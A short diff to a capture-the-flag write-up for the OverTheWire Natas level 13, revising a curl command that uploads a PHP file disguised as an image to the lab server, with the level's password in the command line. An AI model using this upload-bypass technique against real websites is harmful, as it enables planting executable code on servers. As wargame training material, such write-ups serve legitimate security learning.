@@ -28,7 +28,7 @@
 
 3.	Upload the "image" as in Natas12
 
-		$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas13.natas.labs.overthewire.org
+		$ curl -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F filename=image.php -F uploadedfile=@image.php http://natas13.natas.labs.overthewire.org/
 		<html>
 		<head>
 		[cut]
